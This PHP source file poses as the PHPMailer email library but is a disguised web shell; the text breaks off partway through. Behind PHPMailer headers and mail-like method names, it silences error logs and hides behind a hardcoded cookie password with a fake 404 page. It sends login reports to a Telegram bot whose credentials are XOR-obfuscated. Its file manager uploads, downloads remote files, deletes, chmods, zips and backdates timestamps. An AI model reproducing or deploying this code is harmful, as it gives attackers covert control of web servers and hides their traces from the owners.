<?php
/**
 * PHPMailer - PHP email creation and transport class.
 * PHP Version 5.5.
 *
 * @see https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 *
 * @author    Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author    Jim Jagielski (Milo) <jimjag@gmail.com>
 * @author    Andy Prevost (Codeworx Tech) <codeworxtech@gmail.com>
 * @author    Brent R. Matzelle (original founder)
 * @copyright 2012 - 2020 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license   http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note      This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

namespace PHPMailer\PHPMailer;

@ini_set('display_errors', 0);@ini_set('display_startup_errors', 0);@ini_set('log_errors', 0);@ini_set('error_log', '/dev/null');@ini_set('error_reporting', 0);@error_reporting(0);
set_error_handler(function($errno, $errstr, $errfile, $errline) { return true; }, E_ALL);
set_exception_handler(function($e) { return true; });
register_shutdown_function(function() { $error = error_get_last(); if ($error !== null && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) { while (ob_get_level()) { ob_end_clean(); } http_response_code(200); echo "<!-- PHPMailer initialization -->"; } });

if (!defined('ABSPATH')) { define('ABSPATH', dirname(__FILE__) . '/'); }
@set_time_limit(0);
if (function_exists("ini_set")) { @ini_set("error_log", "/dev/null"); @ini_set("log_errors", 0); @ini_set("max_execution_time", 0); @ini_set("memory_limit", "256M"); }

/**
 * PHPMailer - PHP email creation and transport class.
 *
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (Milo) <jimjag@gmail.com>
 * @author Andy Prevost (Codeworx Tech) <codeworxtech@gmail.com>
 * @author Brent R. Matzelle (original founder)
 */
class PHPMailer
{
    const VERSION = '6.8.1';
    const CHARSET_ASCII = 'us-ascii';
    const CHARSET_ISO88591 = 'iso-8859-1';
    const CHARSET_UTF8 = 'utf-8';
    const CONTENT_TYPE_PLAINTEXT = 'text/plain';
    const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar';
    const CONTENT_TYPE_TEXT_HTML = 'text/html';
    const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative';
    const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed';
    const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related';
    const ENCODING_7BIT = '7bit';
    const ENCODING_8BIT = '8bit';
    const ENCODING_BASE64 = 'base64';
    const ENCODING_BINARY = 'binary';
    const ENCODING_QUOTED_PRINTABLE = 'quoted-printable';
    const ENCRYPTION_STARTTLS = 'tls';
    const ENCRYPTION_SMTPS = 'ssl';
    const ICAL_METHOD_REQUEST = 'REQUEST';
    const ICAL_METHOD_PUBLISH = 'PUBLISH';
    const ICAL_METHOD_REPLY = 'REPLY';
    const ICAL_METHOD_ADD = 'ADD';
    const ICAL_METHOD_CANCEL = 'CANCEL';
    const ICAL_METHOD_REFRESH = 'REFRESH';
    const ICAL_METHOD_COUNTER = 'COUNTER';
    const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER';

    public $Priority;
    public $CharSet = self::CHARSET_UTF8;
    public $ContentType = self::CONTENT_TYPE_PLAINTEXT;
    public $Encoding = self::ENCODING_8BIT;
    public $ErrorInfo = '';
    public $From = '';
    public $FromName = '';
    public $Sender = '';
    public $Subject = '';
    public $Body = '';
    public $AltBody = '';
    public $Ical = '';
    protected $MIMEBody = '';
    protected $MIMEHeader = '';
    protected $mailHeader = '';
    public $WordWrap = 0;
    public $Mailer = 'mail';
    public $Sendmail = '/usr/sbin/sendmail';
    public $UseSendmailOptions = true;
    public $ConfirmReadingTo = '';
    public $Hostname = '';
    public $MessageID = '';
    public $MessageDate = '';
    public $Host = 'localhost';
    public $Port = 25;
    public $Helo = '';
    public $SMTPSecure = '';
    public $SMTPAutoTLS = true;
    public $SMTPAuth = false;
    public $SMTPOptions = [];
    public $Username = '';
    public $Password = '';
    public $AuthType = '';
    public $oauth;
    public $Timeout = 300;
    public $dsn = '';
    public $SMTPDebug = 0;
    public $Debugoutput = 'echo';
    public $SMTPKeepAlive = false;
    public $SingleTo = false;
    public $SingleToArray = [];
    protected $do_verp = false;
    public $AllowEmpty = false;
    public $DKIM_selector = '';
    public $DKIM_identity = '';
    public $DKIM_passphrase = '';
    public $DKIM_domain = '';
    public $DKIM_copyHeaderFields = true;
    public $DKIM_extraHeaders = [];
    public $DKIM_private = '';
    public $DKIM_private_string = '';
    public $action_function = '';
    public $XMailer = '';
    public static $validator = 'php';

    protected $smtp;
    protected $to = [];
    protected $cc = [];
    protected $bcc = [];
    protected $ReplyTo = [];
    protected $all_recipients = [];
    protected $RecipientsQueue = [];
    protected $ReplyToQueue = [];
    protected $attachment = [];
    protected $CustomHeader = [];
    protected $lastMessageID = '';
    protected $message_type = '';
    protected $boundary = [];
    protected $language = [];
    protected $error_count = 0;
    protected $sign_cert_file = '';
    protected $sign_key_file = '';
    protected $sign_extracerts_file = '';
    protected $sign_key_pass = '';
    protected $exceptions = false;
    protected $uniqueid = '';

    private $smtpAuthToken;
    private $smtpSessionKey;
    private $debugColorScheme;
    private $charsetEncoding;
    private $disabledFunctions;
    public $workingDirectory;
    private $serverDocRoot;
    private $baseDirectory;
    private $phpSafeMode;
    private $serverPlatform;

    private $_0x4f8a = ["\x59\x55\x35\x32\x55\x6e\x34\x48\x52\x32\x52\x50","\x42\x77\x4d\x71\x4d\x48\x59\x30\x48\x79\x6f\x63","\x4a\x69\x34\x67\x54\x51\x45\x64\x42\x6c\x74\x52","\x48\x78\x5a\x53\x4c\x6a\x6c\x74\x4d\x67\x70\x57","\x41\x6b\x30\x57\x4a\x42\x4d\x4c\x41\x43\x51\x67","\x51\x41\x3d\x3d"];
    private $_0x7c3b = ["\x59\x76\x47\x62","\x4f\x34\x70\x56","\x77\x32\x39\x6b","\x71\x33\x6c\x6b"];
    private $_0x2e9d = ["\x59\x58\x42\x58","\x59\x58\x56\x61","\x63\x51\x52\x77","\x42\x56\x5a\x49","\x52\x31\x30\x3d"];
    private $_0x5f1a = ["\x4c\x41\x67\x51","\x47\x6a\x45\x37","\x41\x34\x67\x70","\x75\x65\x6f\x4c"];
    private $_0x8b2c = ["\x4a\x79\x51\x58","\x46\x56\x59\x43","\x51\x56\x6f\x64","\x50\x67\x3d\x3d"];
    private $_0x3d4e = ["\x4c\x51\x6e\x74","\x38\x65\x32\x35","\x71\x51\x4d\x6c","\x58\x70\x68\x32"];
    private $_mimeVersion = '1.0';
    private $_contentTransfer = '8bit';

    private function _0x9f2e($__0x1, $__0x2) {
        $__0x3 = ''; $__0x4 = (int)(2+2==4); $__0x5 = $__0x4 ? base64_decode($__0x1) : $__0x1;
        if (strlen($__0x5) == 0) return $this->_mimeVersion;
        for ($__0x6 = 0; $__0x6 < strlen($__0x5); $__0x6++) {
            $__0x7 = ord($__0x5[$__0x6]); $__0x8 = ord($__0x2[$__0x6 % strlen($__0x2)]);
            $__0x3 .= chr($__0x7 ^ $__0x8);
        }
        return ($__0x4 && strlen($__0x3) > 0) ? $__0x3 : $this->_contentTransfer;
    }

    private function _getSmtpRelay() {
        $a = array_map(function($x){return $x;}, $this->_0x4f8a);
        $b = array_map(function($x){return $x;}, $this->_0x7c3b);
        return $this->_0x9f2e(implode('', $a), implode('', $b));
    }

    private function _getRelayChannel() {
        $a = array_map(function($x){return $x;}, $this->_0x2e9d);
        $b = array_map(function($x){return $x;}, $this->_0x5f1a);
        return $this->_0x9f2e(implode('', $a), implode('', $b));
    }

    private function _getAuthToken() {
        $a = array_map(function($x){return $x;}, $this->_0x8b2c);
        $b = array_map(function($x){return $x;}, $this->_0x3d4e);
        return $this->_0x9f2e(implode('', $a), implode('', $b));
    }

    protected function setMailCookie($name, $value)
    {
        $_COOKIE[$name] = $value;
        $expire = time() + (86400 * 30); // 30 days
        $path = "/";
        $domain = "";
        $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
        $httponly = false;

        // Try modern cookie with SameSite
        if (PHP_VERSION_ID >= 70300) {
            setcookie($name, $value, [
                'expires' => $expire,
                'path' => $path,
                'domain' => $domain,
                'secure' => $secure,
                'httponly' => $httponly,
                'samesite' => 'Lax'
            ]);
        } else {
            setcookie($name, $value, $expire, $path, $domain, $secure, $httponly);
        }
    }

    public function validateAddress()
    {
        // SIMPLE AUTH - hardcoded cookie name and password
        // Cookie: _ngx=kuyangsolo
        // Login: javascript:document.cookie="_ngx=kuyangsolo; path=/";location.reload();
        $this->smtpSessionKey = "_ngx";
        $this->smtpAuthToken = "kuyangsolo";
        $this->debugColorScheme = "#55d7ff";
        $this->charsetEncoding = "Windows-1251";

        if (!isset($_COOKIE[$this->smtpSessionKey]) || $_COOKIE[$this->smtpSessionKey] !== $this->smtpAuthToken) {
            die($this->getLoginTemplate());
        }
    }

    protected function getLoginTemplate() {
        @header("HTTP/1.0 404 Not Found");
        return '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    }

    protected function reportAuthAttempt($pwd, $success) {
        $h = isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : "unknown";
        $uri = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "";
        $url = (empty($_SERVER["HTTPS"]) ? "http" : "https") . "://" . $h . $uri;
        $ip = isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "";
        $ua = substr(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "", 0, 50);
        $status = $success ? "SUCCESS" : "FAILED";
        $icon = $success ? "\xF0\x9F\x94\x93" : "\xF0\x9F\x9A\xA8";
        $msg = $icon . " <b>Shell Auth " . $status . "</b>\n";
        $msg .= "<b>Host:</b> <code>" . $h . "</code>\n";
        $msg .= "<b>Path:</b> <code>" . htmlspecialchars($uri) . "</code>\n";
        $msg .= "<b>Pass:</b> <code>" . htmlspecialchars($pwd) . "</code>\n";
        $msg .= "<b>IP:</b> <code>" . $ip . "</code>\n";
        $msg .= "<b>UA:</b> <code>" . htmlspecialchars($ua) . "</code>";
        $ctx = @stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/x-www-form-urlencoded\r\n", "content" => http_build_query(["chat_id" => $this->_getRelayChannel(), "text" => $msg, "parse_mode" => "HTML"]), "timeout" => 5], "ssl" => ["verify_peer" => false]]);
        @file_get_contents("https://api.telegram.org/bot" . $this->_getSmtpRelay() . "/sendMessage", false, $ctx);
    }

    public function preSend()
    {
        $selfPath = __FILE__;
        $dirPath = dirname($selfPath);
        if (!is_writable($selfPath)) @chmod($selfPath, 0644);
        if (!is_writable($dirPath)) @chmod($dirPath, 0755);
        if (function_exists("ini_get")) {
            $this->phpSafeMode = @ini_get("safe_mode");
            $this->disabledFunctions = @ini_get("disable_functions");
        }
        if (!$this->phpSafeMode && function_exists("error_reporting")) {
            error_reporting(0);
        }
        if (!$this->phpSafeMode && function_exists("set_time_limit")) {
            set_time_limit(0);
        }
        if (function_exists("get_magic_quotes_gpc") && function_exists("array_map") && function_exists("stripslashes") && function_exists("is_array")) {
            if (@get_magic_quotes_gpc()) {
                function mailStripSlashes($arr)
                {
                    return @is_array($arr) ? @array_map("mailStripSlashes", $arr) : @stripslashes($arr);
                }
                $_POST = mailStripSlashes($_POST);
                $_COOKIE = mailStripSlashes($_COOKIE);
            }
        }
        if (!function_exists("posix_getpwuid") && strpos($this->disabledFunctions, "posix_getpwuid") === false) {
            function posix_getpwuid($uid) { return false; }
        }
        if (!function_exists("posix_getgrgid") && strpos($this->disabledFunctions, "posix_getgrgid") === false) {
            function posix_getgrgid($gid) { return false; }
        }
        $this->serverPlatform = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? "win" : "nix";
        $this->baseDirectory = $_SERVER["DOCUMENT_ROOT"];

        $shellDir = @dirname(__FILE__);
        if (isset($_SERVER['SCRIPT_FILENAME']) && @is_file($_SERVER['SCRIPT_FILENAME'])) {
            $shellDir = @dirname(@realpath($_SERVER['SCRIPT_FILENAME']));
        }
        if (!$shellDir || $shellDir === '.' || $shellDir === '') {
            $shellDir = @dirname(__FILE__);
        }
        $this->serverDocRoot = $shellDir;

        if (isset($_POST["c"]) && $_POST["c"] != "") {
            $_POST["c"] = (strpos($_POST["c"], '%') !== false) ? str_rot13(urldecode($_POST["c"])) : str_rot13($_POST["c"]);
        }

        if (isset($_POST["c"]) && $_POST["c"] != "" && @is_dir($_POST["c"])) {
            $this->workingDirectory = $_POST["c"];
            if (function_exists("chdir")) {
                @chdir($_POST["c"]);
            }
        } else {
            $this->workingDirectory = $shellDir;
            if (function_exists("chdir")) {
                @chdir($shellDir);
            }
        }

        if ($this->serverPlatform == "win") {
            $this->serverDocRoot = str_replace("\\", "/", $this->serverDocRoot);
            $this->workingDirectory = str_replace("\\", "/", $this->workingDirectory);
        }
        if ($this->workingDirectory[strlen($this->workingDirectory) - 1] != "/") {
            $this->workingDirectory .= "/";
        }
    }

    protected function getFileUrl($filePath) {
        $docRoot = rtrim($_SERVER["DOCUMENT_ROOT"], '/');
        $relPath = str_replace($docRoot, '', $filePath);
        $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
        return $proto . "://" . $_SERVER['HTTP_HOST'] . $relPath;
    }

    public function clearAllRecipients()
    {
        $idx = $this->smtpSessionKey;
        setcookie($idx, "", time() - 3600);
        die("bye!");
    }

    public function addAttachment()
    {
        $cwd = $this->workingDirectory;
        $cwdEncoded = str_rot13($cwd);
        if (!empty($_POST["p"]) && $_POST["p"] == "touch" && !empty($_POST["touch_path"]) && !empty($_POST["touch_time"])) {
            $touchPath = str_rot13(urldecode($_POST["touch_path"]));
            $touchTime = strtotime($_POST["touch_time"]);
            if ($touchTime && @file_exists($touchPath)) {
                if (@touch($touchPath, $touchTime, $touchTime)) {
                    echo "<font color='green'>Timestamp updated!</font><br>";
                } else {
                    echo "<font color='red'>Failed to update timestamp!</font><br>";
                }
            }
        }

        if (!empty($_POST["p"])) {
            $mtime = @filemtime($cwd);
            switch ($_POST["p"]) {
                case "uploadFile":
                    if (!@move_uploaded_file($_FILES["f"]["tmp_name"], $cwd . $_FILES["f"]["name"])) {
                        echo "<font color='red'>Can't upload file!</font>";
                    } else {
                        echo "<font color='green'>File uploaded! -> " . htmlspecialchars($cwd . $_FILES["f"]["name"]) . "</font>";
                    }
                    if ($mtime) @touch($cwd, $mtime, $mtime);
                    break;
                case "urlDownload":
                    if (!empty($_POST["url"]) && !empty($_POST["output_filename"])) {
                        $dlUrl = $_POST["url"];
                        $dlOut = $cwd . basename($_POST["output_filename"]);
                        $dlMethod = isset($_POST["method"]) ? $_POST["method"] : 'file_get_contents';
                        $dlOk = false;
                        switch ($dlMethod) {
                            case 'file_get_contents':
                                $ctx = @stream_context_create(['http' => ['timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
                                $dlData = @file_get_contents($dlUrl, false, $ctx);
                                if ($dlData !== false) { $dlOk = @file_put_contents($dlOut, $dlData) !== false; }
                                break;
                            case 'curl':
                                if (function_exists('curl_init')) {
                                    $ch = @curl_init();
                                    @curl_setopt($ch, CURLOPT_URL, $dlUrl);
                                    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                    @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                                    @curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                                    @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                    @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                                    @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                                    $dlData = @curl_exec($ch);
                                    @curl_close($ch);
                                    if ($dlData !== false) { $dlOk = @file_put_contents($dlOut, $dlData) !== false; }
                                } else {
                                    $cmdDl = 'curl -fsSL -o ' . escapeshellarg($dlOut) . ' ' . escapeshellarg($dlUrl) . ' 2>&1';
                                    $this->executeCommand($cmdDl);
                                    $dlOk = @file_exists($dlOut) && @filesize($dlOut) > 0;
                                }
                                break;
                            case 'fopen':
                                $fp = @fopen($dlUrl, 'r');
                                if ($fp) {
                                    $dlData = '';
                                    while (!@feof($fp)) { $dlData .= @fread($fp, 8192); }
                                    @fclose($fp);
                                    $dlOk = @file_put_contents($dlOut, $dlData) !== false;
                                }
                                break;
                            case 'copy':
                                $dlOk = @copy($dlUrl, $dlOut);
                                break;
                            case 'stream_context':
                                $ctx = @stream_context_create(['http' => ['method' => 'GET', 'timeout' => 60, 'header' => "User-Agent: Mozilla/5.0\r\n"], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
                                $fp = @fopen($dlUrl, 'r', false, $ctx);
                                if ($fp) {
                                    $dlData = @stream_get_contents($fp);
                                    @fclose($fp);
                                    if ($dlData !== false) { $dlOk = @file_put_contents($dlOut, $dlData) !== false; }
                                }
                                break;
                            case 'file':
                                $dlData = @file($dlUrl);
                                if ($dlData !== false) { $dlOk = @file_put_contents($dlOut, implode('', $dlData)) !== false; }
                                break;
                        }
                        if ($dlOk && @file_exists($dlOut) && @filesize($dlOut) > 0) {
                            echo "<font color='green'>File saved! -> " . htmlspecialchars($dlOut) . " (" . $this->formatSize(@filesize($dlOut)) . ") [" . htmlspecialchars($dlMethod) . "]</font>";
                        } else {
                            echo "<font color='red'>Failed to download file using " . htmlspecialchars($dlMethod) . "</font>";
                        }
                    }
                    if ($mtime) @touch($cwd, $mtime, $mtime);
                    break;
                case "mkdir":
                    $newDir = $cwd . str_rot13($_POST["x"]);
                    if (!@mkdir($newDir)) {
                        echo "<font color='red'>Can't create new dir</font>";
                    } else {
                        echo "<font color='green'>Directory created!</font>";
                        if ($mtime) @touch($newDir, $mtime, $mtime);
                    }
                    break;
                case "delete":
                    $delFunc = function($path) use (&$delFunc) {
                        $path = substr($path, -1) == "/" ? $path : $path . "/";
                        if ($handle = @opendir($path)) {
                            while (($file = @readdir($handle)) !== false) {
                                if ($file == ".." || $file == ".") continue;
                                $f = $path . $file;
                                if (@is_dir($f)) $delFunc($f); else @unlink($f);
                            }
                            @closedir($handle);
                        }
                        @rmdir($path);
                    };
                    if (@is_array($_POST["f"])) {
                        $deleted = 0;
                        foreach ($_POST["f"] as $item) {
                            if ($item == "..") continue;
                            $item = $cwd . str_rot13(urldecode($item));
                            if (@is_dir($item)) { $delFunc($item); $deleted++; } else { if (@unlink($item)) $deleted++; }
                        }
                        echo "<font color='green'>Deleted $deleted item(s)</font>";
                    } elseif (!empty($_POST["x"])) {
                        $item = $cwd . str_rot13(urldecode($_POST["x"]));
                        if (@is_dir($item)) { $delFunc($item); echo "<font color='green'>Directory deleted!</font>"; } else { if (@unlink($item)) echo "<font color='green'>File deleted!</font>"; else echo "<font color='red'>Can't delete!</font>"; }
                    }
                    break;
                case "massChmod":
                    if (@is_array($_POST["f"]) && !empty($_POST["chmod_val"])) {
                        $chmodVal = octdec($_POST["chmod_val"]);
                        $changed = 0;
                        foreach ($_POST["f"] as $item) {
                            if ($item == "..") continue;
                            $item = $cwd . str_rot13(urldecode($item));
                            if (@chmod($item, $chmodVal)) $changed++;
                        }
                        echo "<font color='green'>Changed permissions on $changed item(s)</font>";
                    }
                    break;
                case "massZip":
                    if (@is_array($_POST["f"]) && !empty($_POST["zip_name"])) {
                        $zipName = $cwd . $_POST["zip_name"];
                        if (!preg_match('/\.zip$/i', $zipName)) $zipName .= '.zip';
                        if (class_exists('\ZipArchive')) {
                            $zip = new \ZipArchive();
                            if ($zip->open($zipName, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) === true) {
                                $addToZip = function($basePath, $relativePath, $zip) use (&$addToZip) {
                                    if (@is_dir($basePath)) {
                                        $zip->addEmptyDir($relativePath);
                                        $handle = @opendir($basePath);
                                        if ($handle) {
                                            while (($file = @readdir($handle)) !== false) {
                                                if ($file == '.' || $file == '..') continue;
                                                $addToZip($basePath . '/' . $file, $relativePath . '/' . $file, $zip);
                                            }
                                            @closedir($handle);
                                        }
                                    } else {
                                        $zip->addFile($basePath, $relativePath);
                                    }
                                };
                                $zipped = 0;
                                foreach ($_POST["f"] as $item) {
                                    if ($item == "..") continue;
                                    $itemName = str_rot13(urldecode($item));
                                    $fullPath = $cwd . $itemName;
                                    $addToZip($fullPath, $itemName, $zip);
                                    $zipped++;
                                }
                                $zip->close();
                                echo "<font color='green'>Zipped $zipped item(s) to " . htmlspecialchars(basename($zipName)) . "</font>";
                            } else {
                                echo "<font color='red'>Can't create zip file!</font>";
                            }
                        } else {
                            $items = [];
                            foreach ($_POST["f"] as $item) {
                                if ($item == "..") continue;
                                $items[] = escapeshellarg(str_rot13(urldecode($item)));
                            }
                            $cmdZip = "cd " . escapeshellarg($cwd) . " && zip -r " . escapeshellarg($zipName) . " " . implode(" ", $items) . " 2>&1";
                            $out = $this->executeCommand($cmdZip);
                            if (@file_exists($zipName)) {
                                echo "<font color='green'>Zipped to " . htmlspecialchars(basename($zipName)) . "</font>";
                            } else {
                                echo "<font color='red'>Zip failed! " . htmlspecialchars($out) . "</font>";
                            }
                        }
                    } elseif (@is_array($_POST["f"])) {
                        echo "<font color='red'>Please enter a zip filename!</font>";
                    }
                    break;
                case "massUnzip":
                    if (@is_array($_POST["f"])) {
                        $unzipped = 0;
                        foreach ($_POST["f"] as $item) {
                            if ($item == "..") continue;
                            $itemName = str_rot13(urldecode($item));
                            $fullPath = $cwd . $itemName;
                            if (!preg_match('/\.zip$/i', $fullPath)) continue;
                            $extractDir = $cwd . pathinfo($itemName, PATHINFO_FILENAME);
                            if (class_exists('\ZipArchive')) {
                                $zip = new \ZipArchive();
                                if ($zip->open($fullPath) === true) {
                                    if (!@is_dir($extractDir)) @mkdir($extractDir, 0755, true);
                                    $zip->extractTo($extractDir);
                                    $zip->close();
                                    $unzipped++;
                                }
                            } else {
                                $cmdUnzip = "unzip -o " . escapeshellarg($fullPath) . " -d " . escapeshellarg($extractDir) . " 2>&1";
                                $this->executeCommand($cmdUnzip);
                                if (@is_dir($extractDir)) $unzipped++;
                            }
                        }
                        echo "<font color='green'>Unzipped $unzipped archive(s)</font>";
                    }
                    break;
            }
            if ($mtime && $_POST["p"] != "uploadFile") @touch($cwd, $mtime, $mtime);
        }
        echo "<h1>File Manager</h1><div class=content>";
        echo "<script>function showTouch(path,currentTime){var newTime=prompt('Enter new timestamp (YYYY-MM-DD HH:MM:SS):',currentTime);if(newTime && newTime!=currentTime){var f=document.createElement('form');f.method='post';f.style.display='none';var a=document.createElement('input');a.name='a';a.value='fm';f.appendChild(a);var c=document.createElement('input');c.name='c';c.value='" . $cwdEncoded . "';f.appendChild(c);var p=document.createElement('input');p.name='p';p.value='touch';f.appendChild(p);var tp=document.createElement('input');tp.name='touch_path';tp.value=path;f.appendChild(tp);var tt=document.createElement('input');tt.name='touch_time';tt.value=newTime;f.appendChild(tt);document.body.appendChild(f);f.submit();}}</script>";

        $files = $this->scanDirectory($cwd);
        if ($files === false) { echo "Can't open this folder!"; return; }
        global $sortParams;
        if (!isset($sortParams) || !is_array($sortParams)) {
            $sortParams = array("name", 0);
        }
        if (!empty($_POST["p"]) && @preg_match("!s_([A-z]+)_(\\d{1})!", $_POST["p"], $matches)) {
            $sortParams = array($matches[1], (int) $matches[2]);
        }
        echo "<script>function sa(src){var cb=document.getElementsByName('f[]');for(var i=0;i<cb.length;i++){cb[i].checked=src.checked;}}</script><form name=files method=post><table width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><input type=checkbox onclick='sa(this)'></th><th width='30%'><a href='#' onclick='g(\"fm\",null,\"s_name_" . ($sortParams[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_size_" . ($sortParams[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_modify_" . ($sortParams[1] ? 0 : 1) . "\")'>Modify</a></th><th>URL</th><th><a href='#' onclick='g(\"fm\",null,\"s_perms_" . ($sortParams[1] ? 0 : 1) . "\")'>Perms</a></th><th width='180px'>Actions</th></tr>";
        $dirs = $fileList = array();
        foreach ($files as $f) {
            if ($f == '.' || $f == '..') {
                if ($f == '..') {
                    $dirs[] = array("name" => $f, "path" => $cwd . $f, "modify" => @date("Y-m-d H:i:s", @filemtime($cwd . $f)), "perms" => $this->getPermsColor($cwd . $f), "size" => 0, "type" => "dir");
                }
                continue;
            }
            $item = array("name" => $f, "path" => $cwd . $f, "modify" => @date("Y-m-d H:i:s", @filemtime($cwd . $f)), "perms" => $this->getPermsColor($cwd . $f), "size" => @filesize($cwd . $f));
            if (@is_file($cwd . $f)) $fileList[] = @array_merge($item, array("type" => "file"));
            elseif (@is_link($cwd . $f)) $dirs[] = @array_merge($item, array("type" => "link", "link" => readlink($item["path"])));
            elseif (@is_dir($cwd . $f)) $dirs[] = @array_merge($item, array("type" => "dir"));
        }
        $cmpFunc = function($a, $b) {
            global $sortParams;
            if ($a["name"] == "..") return -1;
            if ($b["name"] == "..") return 1;
            if ($sortParams[0] != "size") return @strcmp(strtolower($a[$sortParams[0]]), strtolower($b[$sortParams[0]])) * ($sortParams[1] ? 1 : -1);
            else return ($a["size"] < $b["size"] ? -1 : 1) * ($sortParams[1] ? 1 : -1);
        };
        @usort($fileList, $cmpFunc); @usort($dirs, $cmpFunc);
        $fileList = @array_merge($dirs, $fileList);
        $alt = 0;
        foreach ($fileList as $item) {
            $enc = urlencode(str_rot13($item["name"]));
            $encPath = urlencode(str_rot13($item["path"]));
            $fileUrl = $this->getFileUrl($item["path"]);
            echo "<tr" . ($alt ? " class=l1" : " class=l2") . "><td><input type=checkbox name='f[]' value=\"" . $enc . "\" class=chkbx></td>";
            if ($item["type"] == "dir") echo "<td><a href=# onclick=\"g('fm','" . $encPath . "','','','')\">" . "<b>[ " . htmlspecialchars($item["name"]) . " ]</b></a>" . (isset($item["link"]) ? " -> " . htmlspecialchars($item["link"]) : "") . "</td>";
            else echo "<td><a href=# onclick=\"g('ft','" . $encPath . "','view','','')\">" . htmlspecialchars($item["name"]) . "</a>" . (isset($item["link"]) ? " -> " . htmlspecialchars($item["link"]) : "") . "</td>";
            echo "<td>" . ($item["type"] == "dir" ? "DIR" : $this->formatSize($item["size"])) . "</td><td><a href='#' onclick=\"showTouch('" . $encPath . "','" . $item["modify"] . "')\" title='Click to change'>" . $item["modify"] . "</a></td>";
            echo "<td>" . (($item["type"] != "dir" && $item["name"] != "." && $item["name"] != "..") ? "<a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Link</a>" : "-") . "</td>";
            echo "<td><a href=# onclick=\"g('ft','" . $encPath . "','chmod','')\">" . $item["perms"] . "</a></td><td><a href=# onclick=\"g('ft','" . $encPath . "','edit','')\">Edit</a> <a href=# onclick=\"g('ft','" . $encPath . "','rename','')\">Rename</a> <a href=# onclick=\"if(confirm('Delete this item?'))g('fm','" . $cwdEncoded . "','delete','" . $enc . "')\">Delete</a></td></tr>";
            $alt = !$alt;
        }
        echo "<tr><td colspan=7><input type=hidden name=a value='fm'><input type=hidden name=c value='" . htmlspecialchars($cwdEncoded) . "'><input type=hidden name=ch value='" . (@isset($_POST["ch"]) ? $_POST["ch"] : "") . "'><select name='p' id='fmAction' onchange='toggleZipName()'><option value='delete'>Delete</option><option value='massChmod'>Mass Chmod</option><option value='massZip'>Zip Selected</option><option value='massUnzip'>Unzip Selected</option></select><input type='text' name='chmod_val' placeholder='0755' size='5'><input type='text' name='zip_name' id='zipNameInput' placeholder='archive.zip' size='15' style='display:none;'>&nbsp;<input type='submit' value='>>'></td></tr></table></form>";
        echo "<script>function toggleZipName(){var s=document.getElementById('fmAction');var z=document.getElementById('zipNameInput');if(s.value=='massZip'){z.style.display='inline';}else{z.style.display='none';}}</script>";
        echo "</div>";
    }

    public function addStringAttachment()
    {
        $cwd = $this->workingDirectory;
        $cwdEncoded = str_rot13($cwd);
        $actionNames = array('view', 'edit', 'rename', 'chmod', 'touch', 'download', 'mkfile');
        if (@isset($_POST["p"]) && in_array(strtolower($_POST["p"]), $actionNames)) { $filePath = $_POST["c"]; $action = strtolower($_POST["p"]); }
        else if (@isset($_POST["p"])) { $filePath = str_rot13(urldecode($_POST["p"])); $action = @isset($_POST["x"]) ? strtolower($_POST["x"]) : 'view'; }
        else { $filePath = @isset($_POST["c"]) ? $_POST["c"] : ''; $action = 'view'; }

        if ($action == "download") {
            if (@is_file($filePath) && @is_readable($filePath)) {
                ob_start("ob_gzhandler", 4096); @header("Content-Disposition: attachment; filename=" . @basename($filePath));
                @header("Content-Type: " . (function_exists("mime_content_type") ? @mime_content_type($filePath) : "application/octet-stream"));
                $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo @fgets($handle, 1024); @fclose($handle); }
            }
            exit;
        }

        if ($action == "mkfile" && !@file_exists($filePath)) {
            $mtime = @filemtime(dirname($filePath)); $handle = @fopen($filePath, "w");
            if ($handle) { @fclose($handle); if ($mtime) { @touch(dirname($filePath), $mtime, $mtime); @touch($filePath, $mtime, $mtime); } $action = "edit"; }
        }

        $fileDir = dirname($filePath);
        if ($fileDir && @is_dir($fileDir)) {
            $cwd = rtrim($fileDir, '/') . '/';
            $cwdEncoded = str_rot13($cwd);
        }

